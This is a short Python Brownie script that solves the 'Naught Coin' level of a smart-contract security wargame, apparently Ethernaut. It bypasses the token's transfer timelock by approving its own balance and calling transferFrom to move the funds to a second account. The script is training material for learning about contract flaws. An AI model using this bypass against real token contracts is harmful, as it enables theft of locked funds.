from brownie import web3, NaughtCoin

from scripts.helpful_scripts import (
    get_account,
    get_level_contract,
    submit_instance,
    print_out_if_level_solved,
)

LEVEL_NAME = "15_naught_coin"
INTERFACE_CONTRACT = NaughtCoin
INSTANCE_VALUE_WEI = web3.toWei(0, "ether")


def solve_level(level_contract):
    account = get_account()
    balance = level_contract.balanceOf(account)
    print("Balance is: " + str(balance))
    level_contract.approve(account, balance, {"from": account})
    level_contract.transferFrom(account, get_account(1), balance, {"from": account})


# brownie run scripts/_15_naught_coin.py --network rinkeby-fork
def main():
    level_contract = get_level_contract(
        LEVEL_NAME, INTERFACE_CONTRACT, INSTANCE_VALUE_WEI
    )
    solve_level(level_contract)
    level_solved = submit_instance(level_contract.address)
    print_out_if_level_solved(level_solved, LEVEL_NAME)
    return level_solved
